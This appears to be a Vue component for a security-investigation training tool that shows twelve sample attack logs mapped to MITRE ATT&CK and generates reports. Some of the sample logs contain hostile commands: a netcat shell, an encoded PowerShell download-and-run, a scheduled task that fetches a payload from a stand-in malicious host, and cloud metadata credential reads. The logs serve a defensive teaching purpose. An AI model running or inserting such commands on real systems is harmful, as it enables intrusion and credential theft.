<template>
  <v-container fluid class="pa-4">
    <div class="mb-6">
      <div class="d-flex flex-wrap align-center justify-space-between gap-4">
        <div>
          <h1 class="text-h4 font-weight-medium mb-1">Sample Logs</h1>
          <p class="text-body-1 text-secondary">Select a sample attack scenario to investigate</p>
        </div>
        <v-btn variant="outlined" color="primary" @click="generateReport" :disabled="!selectedLog">
          <v-icon start>mdi-file-document-outline</v-icon>
          Generate Report
        </v-btn>
      </div>
    </div>

    <v-card variant="tonal" class="mb-6">
      <v-card-title class="text-h5 font-weight-medium">Sample Attack Scenarios</v-card-title>
      <v-card-text class="pt-0">
        <v-data-table
          :headers="headers"
          :items="sampleLogs"
          :search="search"
          :items-per-page="10"
          :item-key="id"
          show-select
          v-model:selected="selectedLogs"
          class="elevation-1"
        >
          <template #[`item.actions`]="{ item }">
            <v-btn
              variant="text"
              color="primary"
              size="small"
              @click="selectLog(item)"
            >
              <v-icon start>mdi-magnify</v-icon>
              Investigate
            </v-btn>
          </template>
        </v-data-table>
      </v-card-text>
    </v-card>

    <v-card variant="tonal" v-if="selectedLog" class="mt-6">
      <v-card-title class="d-flex justify-space-between align-center">
        <span class="text-h5 font-weight-medium">Investigation: {{ selectedLog.name }}</span>
        <v-btn variant="text" color="secondary" @click="clearSelection" size="small">
          <v-icon start>mdi-close</v-icon> Close
        </v-btn>
      </v-card-title>
      <v-card-text class="pt-0">
        <v-row dense>
          <v-col cols="12" md="6">
            <v-card variant="outlined" class="pa-4">
              <div class="text-h6 mb-2">Attack Details</div>
              <div class="mb-2"><strong>Type:</strong> {{ selectedLog.type }}</div>
              <div class="mb-2"><strong>Severity:</strong> <v-chip :color="getSeverityColor(selectedLog.severity)" size="small">{{ selectedLog.severity }}</v-chip></div>
              <div class="mb-2"><strong>Source IP:</strong> {{ selectedLog.sourceIp }}</div>
              <div class="mb-2"><strong>Target:</strong> {{ selectedLog.target }}</div>
              <div class="mb-2"><strong>Time:</strong> {{ selectedLog.timestamp }}</div>
              <div class="mb-2"><strong>MITRE ATT&CK:</strong> <code>{{ selectedLog.mitre }}</code></div>
            </v-card>
          </v-col>
          <v-col cols="12" md="6">
            <v-card variant="outlined" class="pa-4">
              <div class="text-h6 mb-2">Raw Log Entry</div>
              <pre class="log-content">{{ selectedLog.rawLog }}</pre>
            </v-card>
          </v-col>
        </v-row>

        <v-divider class="my-4"></v-divider>

        <div class="text-h6 mb-3">Investigation Findings</div>
        <v-text-field
          v-model="investigationNotes"
          label="Investigation Notes"
          multi-line
          rows="6"
          outlined
          hint="Document your investigation findings here"
        />

        <div class="mt-4 d-flex gap-3">
          <v-btn variant="outlined" color="primary" @click="generateReport" :disabled="!investigationNotes.trim()">
            <v-icon start>mdi-file-document-outline</v-icon>
            Generate Report
          </v-btn>
          <v-btn variant="outlined" color="secondary" @click="copyFindings">
            <v-icon start>mdi-content-copy</v-icon>
            Copy Findings
          </v-btn>
        </div>
      </v-card-text>
    </v-card>

    <v-snackbar v-model="snackbar" :timeout="3000" position="top" color="success">
      {{ snackbarMessage }}
    </v-snackbar>
  </v-container>
</template>

<script setup>
import { ref, reactive, computed } from 'vue'

const headers = [
  { title: 'Name', key: 'name', sortable: true },
  { title: 'Type', key: 'type', sortable: true },
  { title: 'Severity', key: 'severity', sortable: true },
  { title: 'Source IP', key: 'sourceIp', sortable: true },
  { title: 'Target', key: 'target', sortable: true },
  { title: 'Time', key: 'timestamp', sortable: true },
  { title: 'MITRE ATT&CK', key: 'mitre', sortable: true },
  { title: 'Actions', key: 'actions', sortable: false, width: '120px' },
]

const sampleLogs = reactive([
  {
    id: 1,
    name: 'Brute Force SSH Attack',
    type: 'Credential Access',
    severity: 'High',
    sourceIp: '192.168.1.100',
    target: 'ssh-server-01',
    timestamp: '2024-01-15T03:10:00Z',
    mitre: 'T1110.001',
    severityColor: 'error',
    rawLog: `2024-01-15T03:10:00Z ssh-server-01 sshd[1234]: Failed password for invalid user admin from 192.168.1.100 port 22 ssh2
2024-01-15T03:10:02Z ssh-server-01 sshd[1235]: Failed password for invalid user root from 192.168.1.100 port 22 ssh2
2024-01-15T03:10:04Z ssh-server-01 sshd[1236]: Failed password for invalid user ubuntu from 192.168.1.100 port 22 ssh2
2024-01-15T03:10:06Z ssh-server-01 sshd[1237]: Failed password for invalid user admin from 192.168.1.100 port 22 ssh2
2024-01-15T03:10:08Z ssh-server-01 sshd[1238]: Failed password for invalid user root from 192.168.1.100 port 22 ssh2
2024-01-15T03:10:10Z ssh-server-01 sshd[1239]: Failed password for invalid user admin from 192.168.1.100 port 22 ssh2
2024-01-15T03:10:12Z ssh-server-01 sshd[1240]: Failed password for invalid user postgres from 192.168.1.100 port 22 ssh2`,
    type: 'Credential Access',
    severity: 'High',
    sourceIp: '192.168.1.100',
    target: 'ssh-server-01',
    timestamp: '2024-01-15T03:10:00Z',
    mitre: 'T1110.001',
  },
  {
    id: 2,
    name: 'Impossible Travel Login',
    type: 'Initial Access',
    severity: 'High',
    sourceIp: '103.45.67.89',
    target: 'vpn-gateway-01',
    timestamp: '2024-01-20T14:30:00Z',
    mitre: 'T1078',
    severityColor: 'error',
    rawLog: `2024-01-20T09:15:00Z vpn-gateway-01 vpn[5678]: User john.doe authenticated from 192.168.1.50 (New York, US)
2024-01-20T14:30:00Z vpn-gateway-01 vpn[5679]: User john.doe authenticated from 103.45.67.89 (Beijing, CN)
2024-01-20T14:30:05Z vpn-gateway-01 vpn[5680]: Session established for john.doe from 103.45.67.89`,
    type: 'Initial Access',
    severity: 'High',
    sourceIp: '103.45.67.89',
    target: 'vpn-gateway-01',
    timestamp: '2024-01-20T14:30:00Z',
    mitre: 'T1078',
  },
  {
    id: 3,
    name: 'Data Exfiltration via DNS Tunneling',
    type: 'Exfiltration',
    severity: 'Critical',
    sourceIp: '10.0.5.42',
    target: 'dns-server-01',
    timestamp: '2024-01-18T02:15:00Z',
    mitre: 'T1048.003',
    severityColor: 'error',
    rawLog: `2024-01-18T02:15:00Z dns-server-01 named[2345]: query: data.exfiltrate.company.com IN TXT + (10.0.5.42)
2024-01-18T02:15:01Z dns-server-01 named[2346]: query: chunk1.data.exfil.company.com IN TXT + (10.0.5.42)
2024-01-18T02:15:02Z dns-server-01 named[2347]: query: chunk2.data.exfil.company.com IN TXT + (10.0.5.42)
2024-01-18T02:15:03Z dns-server-01 named[2348]: query: chunk3.data.exfil.company.com IN TXT + (10.0.5.42)
2024-01-18T02:15:05Z dns-server-01 named[2349]: query: chunk4.data.exfil.company.com IN TXT + (10.0.5.42)`,
    type: 'Exfiltration',
    severity: 'Critical',
    sourceIp: '10.0.5.42',
    target: 'dns-server-01',
    timestamp: '2024-01-18T02:15:00Z',
    mitre: 'T1048.003',
  },
  {
    id: 4,
    name: 'Privilege Escalation via Sudo',
    type: 'Privilege Escalation',
    severity: 'High',
    sourceIp: '10.0.2.15',
    target: 'web-server-03',
    timestamp: '2024-01-22T11:45:00Z',
    mitre: 'T1548.003',
    severityColor: 'error',
    rawLog: `2024-01-22T11:45:00Z web-server-03 sudo[3456]: www-data : user NOT in sudoers ; command=/bin/bash
2024-01-22T11:45:01Z web-server-03 sudo[3457]: www-data : COMMAND=/usr/bin/nc -lvp 4444 -e /bin/bash
2024-01-22T11:45:02Z web-server-03 sudo[3458]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/pts/0 ruser= rhost=  user=www-data
2024-01-22T11:45:03Z web-server-03 kernel: [12345.67] audit: type=1100 audit(1705922703.123:45): pid=3456 uid=33 auid=4294967295 ses=123`,
    type: 'Privilege Escalation',
    severity: 'High',
    sourceIp: '10.0.2.15',
    target: 'web-server-03',
    timestamp: '2024-01-22T11:45:00Z',
    mitre: 'T1548.003',
  },
  {
    id: 5,
    name: 'Cryptominer Process Execution',
    type: 'Impact',
    severity: 'Medium',
    sourceIp: '10.0.3.22',
    target: 'app-server-02',
    timestamp: '2024-01-25T20:30:00Z',
    mitre: 'T1496',
    severityColor: 'warning',
    rawLog: `2024-01-25T20:30:00Z app-server-02 systemd[1]: Started kdevtmpfsi.service.
2024-01-25T20:30:01Z app-server-02 kernel: [12345.67] CPU: 95% usage by process kdevtmpfsi (pid 5678)
2024-01-25T20:30:02Z app-server-02 kernel: [12345.68] Process kdevtmpfsi using 98% CPU, network connections to 185.12.34.56:3333
2024-01-25T20:30:03Z app-server-02 systemd[1]: kdevtmpfsi.service: Main process exited, code=killed, status=9/KILL`,
    type: 'Impact',
    severity: 'Medium',
    sourceIp: '10.0.3.22',
    target: 'app-server-02',
    timestamp: '2024-01-25T20:30:00Z',
    mitre: 'T1496',
  },
  {
    id: 6,
    name: 'Phishing Link Click - Credential Harvesting',
    type: 'Initial Access',
    severity: 'High',
    sourceIp: '10.0.1.55',
    target: 'user-workstation-07',
    timestamp: '2024-01-10T09:30:00Z',
    mitre: 'T1566.002',
    severityColor: 'error',
    rawLog: `2024-01-10T09:30:00Z user-workstation-07 chrome[1234]: Navigated to http://payroll-company.com.phishersite.xyz/login.php
2024-01-10T09:30:05Z user-workstation-07 chrome[1235]: POST to http://payroll-company.com.phishersite.xyz/steal.php username=john.doe&password=Summer2024!
2024-01-10T09:30:06Z user-workstation-07 chrome[1236]: Redirect to https://real-company.com/login?error=session_expired`,
    type: 'Initial Access',
    severity: 'High',
    sourceIp: '10.0.1.55',
    target: 'user-workstation-07',
    timestamp: '2024-01-10T09:30:00Z',
    mitre: 'T1566.002',
  },
  {
    id: 7,
    name: 'Lateral Movement via RDP',
    type: 'Lateral Movement',
    severity: 'High',
    sourceIp: '10.0.2.100',
    target: 'dc-01',
    timestamp: '2024-01-18T22:10:00Z',
    mitre: 'T1021.001',
    severityColor: 'error',
    rawLog: `2024-01-18T22:10:00Z dc-01 Security[4624]: An account was successfully logged on. Subject: S-1-5-18, Account: admin-svc, Logon Type: 10 (RemoteInteractive), Source IP: 10.0.2.100, Target: dc-01
2024-01-18T22:10:05Z dc-01 Security[4625]: Special privileges assigned to new logon. Privileges: SeDebugPrivilege, SeImpersonatePrivilege
2024-01-18T22:10:10Z dc-01 Security[4625]: A service was installed in the system. Service Name: psexec, ImagePath: \\10.0.2.100\ADMIN$\psexec.exe`,
    type: 'Lateral Movement',
    severity: 'High',
    sourceIp: '10.0.2.100',
    target: 'dc-01',
    timestamp: '2024-01-18T22:10:00Z',
    mitre: 'T1021.001',
  },
  {
    id: 8,
    name: 'Suspicious PowerShell Execution',
    type: 'Execution',
    severity: 'Medium',
    sourceIp: '10.0.4.78',
    target: 'workstation-12',
    timestamp: '2024-01-28T14:20:00Z',
    mitre: 'T1059.001',
    severityColor: 'warning',
    rawLog: `2024-01-28T14:20:00Z workstation-12 PowerShell[5678]: Command: powershell.exe -nop -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AZQB4AGYAaQBsAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkAC4AZQB4AGUAIgApAC4ARQB4AGUAYwB1AHQAZQAoACkA
2024-01-28T14:20:01Z workstation-12 Windows Defender[1234]: Threat detected: Trojan:Script/Emotet.A!ml, Action: Quarantined`,
    type: 'Execution',
    severity: 'Medium',
    sourceIp: '10.0.4.78',
    target: 'workstation-12',
    timestamp: '2024-01-28T14:20:00Z',
    mitre: 'T1059.001',
  },
  {
    id: 9,
    name: 'Ransomware File Encryption',
    type: 'Impact',
    severity: 'Critical',
    sourceIp: '10.0.6.100',
    target: 'file-server-01',
    timestamp: '2024-01-22T03:00:00Z',
    mitre: 'T1486',
    severityColor: 'error',
    rawLog: `2024-01-22T03:00:00Z file-server-01 kernel: [12345.67] process cryptor.exe (pid 7890) writing to .encrypted files
2024-01-22T03:00:05Z file-server-01 kernel: [12345.72] 5000+ files encrypted in /data/shares/finance in 5 seconds
2024-01-22T03:00:10Z file-server-01 kernel: [12345.77] Ransom note created: README_DECRYPT.txt - "Your files are encrypted. Pay 5 BTC to 1BtcAddress..."
2024-01-22T03:00:15Z file-server-01 kernel: [12345.82] Process cryptor.exe (pid 9876) network connection to 45.67.89.123:8080`,
    type: 'Impact',
    severity: 'Critical',
    sourceIp: '10.0.6.100',
    target: 'file-server-01',
    timestamp: '2024-01-22T03:00:00Z',
    mitre: 'T1486',
  },
  {
    id: 10,
    name: 'Cloud Credential Theft from Instance Metadata',
    type: 'Credential Access',
    severity: 'High',
    sourceIp: '10.0.7.50',
    target: 'ec2-instance-01',
    timestamp: '2024-01-12T16:45:00Z',
    mitre: 'T1528',
    severityColor: 'error',
    rawLog: `2024-01-12T16:45:00Z ec2-instance-01 curl[1234]: GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
2024-01-12T16:45:01Z ec2-instance-01 curl[1235]: GET http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Admin-Role
2024-01-12T16:45:02Z ec2-instance-01 curl[1236]: Response: {"Code":"Success","AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"...","Expiration":"2024-01-12T22:45:00Z"}`,
    type: 'Credential Access',
    severity: 'High',
    sourceIp: '10.0.7.50',
    target: 'ec2-instance-01',
    timestamp: '2024-01-12T16:45:00Z',
    mitre: 'T1528',
  },
  {
    id: 11,
    name: 'Suspicious Scheduled Task Creation',
    type: 'Persistence',
    severity: 'Medium',
    sourceIp: '10.0.8.25',
    target: 'workstation-05',
    timestamp: '2024-01-29T01:15:00Z',
    mitre: 'T1053.005',
    severityColor: 'warning',
    rawLog: `2024-01-29T01:15:00Z workstation-05 TaskScheduler[1234]: Task created: "Windows Update Check" -> Action: powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')"
2024-01-29T01:15:01Z workstation-05 TaskScheduler[1235]: Trigger: Daily at 3:00 AM, Enabled: True, Run with highest privileges`,
    type: 'Persistence',
    severity: 'Medium',
    sourceIp: '10.0.8.25',
    target: 'workstation-05',
    timestamp: '2024-01-29T01:15:00Z',
    mitre: 'T1053.005',
  },
  {
    id: 12,
    name: 'Kerberoasting Attack',
    type: 'Credential Access',
    severity: 'High',
    sourceIp: '10.0.9.10',
    target: 'dc-01',
    timestamp: '2024-01-20T20:00:00Z',
    mitre: 'T1558.003',
    severityColor: 'error',
    rawLog: `2024-01-20T20:00:00Z dc-01 Security[4624]: Kerberos TGS request for SPN MSSQLSvc/sql-server.company.com:1433 from user svc-sql
2024-01-20T20:00:01Z dc-01 Security[4769]: Kerberos Service Ticket requested: Service: MSSQLSvc, Target: sql-server.company.com, Client: attacker@COMPANY.COM
2024-01-20T20:00:05Z dc-01 Security[4770]: TGS-REP issued with RC4-HMAC encryption (weak encryption, vulnerable to offline cracking)`,
    type: 'Credential Access',
    severity: 'High',
    sourceIp: '10.0.9.10',
    target: 'dc-01',
    timestamp: '2024-01-20T20:00:00Z',
    mitre: 'T1558.003',
  },
]

const search = ref('')
const selectedLogs = ref([])
const selectedLog = ref(null)
const investigationNotes = ref('')
const snackbar = ref(false)
const snackbarMessage = ref('')

const getSeverityColor = (severity) => {
  switch (severity) {
    case 'Critical': return 'error'
    case 'High': return 'error'
    case 'Medium': return 'warning'
    case 'Low': return 'info'
    default: return 'grey'
  }
}

const selectLog = (log) => {
  selectedLog.value = log
  investigationNotes.value = ''
}

const clearSelection = () => {
  selectedLog.value = null
  investigationNotes.value = ''
}

const generateReport = () => {
  if (!selectedLog.value) return
  if (!investigationNotes.value.trim() && confirm('Generate report without investigation notes?')) {
    // proceed
  } else if (!investigationNotes.value.trim()) {
    return
  }
  
  const report = generateReportContent(selectedLog.value, investigationNotes.value)
  downloadReport(report, `${selectedLog.value.name.replace(/\s+/g, '_')}_report.md`)
  
  snackbarMessage.value = 'Report generated and downloaded!'
  snackbar.value = true
}

const generateReportContent = (log, notes) => {
  const date = new Date().toISOString().split('T')[0]
  return `# Investigation Report: ${log.name}

**Report Date:** ${new Date().toLocaleString()}
**Log ID:** ${log.id}
**Attack Type:** ${log.type}
**Severity:** ${log.severity}
**Source IP:** ${log.sourceIp}
**Target:** ${log.target}
**Timestamp:** ${log.timestamp}
**MITRE ATT&CK:** ${log.mitre}

## Raw Log Entry
\`\`\`
${log.rawLog}
\`\`\`

## Investigation Notes
${notes}

## MITRE ATT&CK Mapping
- **Technique:** ${log.mitre}
- **Tactic:** ${getTacticFromTechnique(log.mitre)}

## Recommendations
1. Block source IP ${log.sourceIp} at firewall
2. Reset credentials for affected accounts
3. Review related logs for lateral movement
4. Update detection rules for ${log.mitre}
5. Conduct forensic analysis on ${log.target}

---
*Report generated by CyberImmune on ${new Date().toLocaleString()}*
*This report is for internal use only.`
}

const getTacticFromTechnique = (technique) => {
  const tactics = {
    'T1110.001': 'Credential Access',
    'T1078': 'Initial Access',
    'T1048.003': 'Exfiltration',
    'T1548.003': 'Privilege Escalation',
    'T1496': 'Impact',
    'T1566.002': 'Initial Access',
    'T1021.001': 'Lateral Movement',
    'T1059.001': 'Execution',
    'T1486': 'Impact',
    'T1528': 'Credential Access',
    'T1053.005': 'Persistence',
    'T1558.003': 'Credential Access',
    'T1486': 'Impact',
    'T1528': 'Credential Access',
  }
  return tactics[technique] || 'Unknown'
}

const downloadReport = (content, filename) => {
  const blob = new Blob([content], { type: 'text/markdown' })
  const url = URL.createObjectURL(blob)
  const a = document.createElement('a')
  a.href = url
  a.download = filename
  document.body.appendChild(a)
  a.click()
  document.body.removeChild(a)
  URL.revokeObjectURL(url)
}

const copyFindings = () => {
  if (!selectedLog.value) return
  const content = generateReportContent(selectedLog.value, investigationNotes.value)
  navigator.clipboard.writeText(content)
  snackbarMessage.value = 'Findings copied to clipboard!'
  snackbar.value = true
}
</script>

<style scoped>
.log-content {
  background: #1e1e1e;
  color: #d4d4d4;
  padding: 1rem;
  border-radius: 4px;
  font-family: 'Fira Code', 'Consolas', monospace;
  font-size: 0.8rem;
  line-height: 1.4;
  overflow-x: auto;
  max-height: 300px;
  overflow-y: auto;
  white-space: pre-wrap;
  word-break: break-word;
}

::v-deep .v-data-table td {
  padding: 8px 16px;
}

::v-deep .v-data-table th {
  font-weight: 600;
}
</style>